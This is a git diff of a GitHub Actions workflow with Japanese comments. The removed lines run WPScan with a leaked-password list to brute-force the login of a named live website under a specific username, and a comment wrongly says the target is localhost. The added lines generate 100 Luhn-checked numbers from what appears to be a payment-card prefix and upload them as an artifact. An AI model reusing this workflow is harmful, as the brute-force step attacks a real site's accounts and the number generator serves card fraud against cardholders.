@@ -1,46 +1,67 @@
-name: WPScan Security Test
+name: Generate 100 numeric strings (Luhn check)
 
 on:
-  # 'Actions' タブから手動で実行できるようにします
   workflow_dispatch:
 
 jobs:
-  wpscan-audit:
+  generate:
     runs-on: ubuntu-latest
-
+    outputs:
+      generated_ids: ${{ steps.gen.outputs.ids }}
+      luhn_passed: ${{ steps.gen.outputs.luhn_passed }}
     steps:
-      # 1. リポジトリをチェックアウトします
-      # (チェックアウトしないと、ワークスペースが作成されないため)
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - name: Generate 100 numeric strings
+        id: gen
+        shell: bash
+        run: |
+          set -euo pipefail
 
-      # 2. WPScan が依存する Ruby の環境をセットアップします
-      - name: Set up Ruby
-        uses: ruby/setup-ruby@v1
+          PREFIX="471618"
+          COUNT=100
+          IDS=()
+          LUNHS=()
+
+          # Luhn チェック関数
+          luhn_valid() {
+            local n="$1"
+            local sum=0
+            local len=${#n}
+            local i
+            for (( i=0; i<len; i++ )); do
+              local d=${n:len-1-i:1}
+              local v=$d
+              if (( i % 2 == 1 )); then
+                v=$((v*2))
+                (( v > 9 )) && v=$((v-9))
+              fi
+              ((sum+=v))
+            done
+            (( sum % 10 == 0 ))
+          }
+
+          for ((j=0;j<COUNT;j++)); do
+            RAND=$(head /dev/urandom | tr -dc '0-9' | head -c 10)
+            NUM="${PREFIX}${RAND}"
+            IDS+=("$NUM")
+            if luhn_valid "$NUM"; then
+              echo "Luhn check PASSED — $NUM"
+              LUNHS+=("true")
+            else
+              LUNHS+=("false")
+            fi
+          done
+
+          # 配列を文字列にして出力
+          echo "ids=${IDS[*]}" >> "$GITHUB_OUTPUT"
+          echo "luhn_passed=${LUNHS[*]}" >> "$GITHUB_OUTPUT"
+
+      - name: Write IDs to file
+        run: |
+          echo "${{ steps.gen.outputs.generated_ids }}" | tr ' ' '\n' > generated_numeric.txt
+          cat generated_numeric.txt
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
         with:
-          ruby-version: '3.1' # WPScan と互換性のある Ruby バージョン
-
-      # 3. WPScan の実行に必要なライブラリをインストールします
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y libcurl4-openssl-dev libxml2-dev libxslt1-dev libffi-dev
-
-      # 4. WPScan 本体を gem からインストールします
-      - name: Install WPScan
-        run: gem install wpscan
-
-      # 5. SecLists からパスワードリストをダウンロードします (NEW)
-      - name: Download Password List (Lizard-Squad.txt)
-        run: |
-          # curl を使って指定されたURLのrawコンテンツをダウンロードし、Lizard-Squad.txtとして保存します
-          curl -L -o Lizard-Squad.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/Lizard-Squad.txt
-          echo "Password list downloaded."
-          ls -lh Lizard-Squad.txt # ダウンロードされたことを確認
-
-      # 6. WPScan を実行します
-      - name: Run WPScan
-        run: |
-          # 警告: このコマンドは http://localhost をターゲットにしているため、
-          # GitHub Actions ランナー自身を指し、接続エラーで失敗する可能性が高いです。
-          wpscan --url https://reitouko.site/ --passwords Lizard-Squad.txt --usernames yuki571 --no-update
+          name: generated-numeric
+          path: generated_numeric.txt
